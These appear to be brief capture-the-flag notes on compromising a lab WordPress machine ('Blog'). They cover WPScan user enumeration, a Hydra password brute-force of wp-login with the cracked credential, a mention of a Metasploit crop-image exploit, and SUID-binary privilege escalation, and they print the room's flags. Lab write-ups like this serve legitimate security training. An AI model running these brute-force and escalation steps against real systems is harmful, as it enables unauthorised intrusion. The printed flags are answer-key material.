
# Blog 

# Target IP : 10.10.60.247

# My IP : 10.17.6.109

# PORT 445
just a rabbit hole


# PORT 80 

/robots.txt
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

wordpress 5.0
use wpscan
```bash
wpscan --url http://blog.thm --enumerate u | tee wpscan.log  
```

log=kwheel&pwd=kwheel&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt  10.10.60.247 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1 :F=The password you entered for the username" -V -t 30

[80][http-post-form] host: 10.10.60.247   login: kwheel   password: cutiepie1

```

use metasploit to exploit crop vulnerablity
```bash
find / -perm -u=s -type f 2>/dev/null

/usr/sbin/checker
ltrace /usr/sbin/checker



export admin=1

> user root
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318

cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```
